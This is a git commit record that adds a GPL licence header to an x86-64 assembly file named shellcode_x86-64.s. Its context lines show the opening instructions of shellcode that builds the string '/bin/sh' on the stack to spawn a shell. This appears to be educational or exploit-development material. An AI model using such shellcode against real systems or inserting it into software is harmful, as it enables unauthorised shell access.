b8e28c200ebc8698233ff529f56e56ec27eb3cd2
Robin Nehls <nehls@mi.fu-berlin.de>
2010-02-13 19:19:39 +0100

    Added licence to files

--- shellcode_x86-64.s
+++ shellcode_x86-64.s
@@ -1,3 +1,19 @@
+/*
+ *      shellcode_x86-64.s
+ *      
+ *      Copyright 2010 Robin Nehls <nehls@mi.fu-berlin.de>
+ *      
+ *      This program is free software; you can redistribute it and/or modify
+ *      it under the terms of the GNU General Public License as published by
+ *      the Free Software Foundation; either version 2 of the License, or
+ *      (at your option) any later version.
+ *      
+ *      This program is distributed in the hope that it will be useful,
+ *      but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *      GNU General Public License for more details.
+ */
+
 mov $0x68732f6e69622f30,%rdi    /* move "hs/nib/0" into rdi */
 shr $8,%rdi                     /* shift right rdi by 8 bits to create "\0hs/nib/" turning the 0 at the end in a leading \0 :) */
 push %rdi                       /* push "\0hs/nib/" to the stack */
